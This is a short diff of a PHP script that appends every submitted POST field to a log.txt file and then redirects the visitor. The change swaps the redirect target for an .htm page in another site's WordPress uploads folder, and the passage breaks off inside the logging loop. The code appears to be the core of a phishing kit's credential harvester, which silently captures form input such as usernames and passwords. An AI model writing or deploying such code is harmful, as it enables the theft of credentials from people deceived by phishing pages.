@@ -1,5 +1,5 @@
 <?php
-header("Location: https://admin.vizionary.com");
+header("Location: https://bizztor.com/wp-content/uploads/2018/04/secret.htm");
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
